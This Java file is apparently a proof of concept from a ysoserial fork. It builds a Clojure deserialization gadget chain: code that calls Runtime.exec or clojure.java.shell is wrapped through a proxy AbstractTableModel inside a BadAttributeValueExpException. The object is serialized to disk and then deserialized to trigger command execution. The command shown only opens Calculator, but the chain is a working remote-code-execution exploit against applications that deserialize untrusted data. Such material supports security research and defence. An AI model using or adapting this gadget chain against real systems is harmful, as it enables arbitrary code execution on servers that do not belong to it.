package ysoserial.payloads.tabbyGadgetChains.Clojure;

import clojure.core$comp$fn__4727;
import clojure.core$constantly$fn__4614;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Poc2 {
    public static String fileName = "Clojure.bin";

    public static void main(String[] args) throws Exception {


        String payload1 = "(import 'java.lang.Runtime)\n" +
                "(. (Runtime/getRuntime) exec\"open -a Calculator.app\")";

        String payload2 = "(use '[clojure.java.shell :only [sh]])\n" +
                "(sh\"open\" \"-a\" \"Calculator.app\")";


        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        HashMap<Object, Object> map = new HashMap<>();
        core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
        core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());
        map.put("hashCode", core2);
        model.__initClojureFnMappings(PersistentArrayMap.create(map));

        BadAttributeValueExpException exception = new BadAttributeValueExpException("test");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, model);

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(exception);
        outputStream.close();


//        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();

    }
}
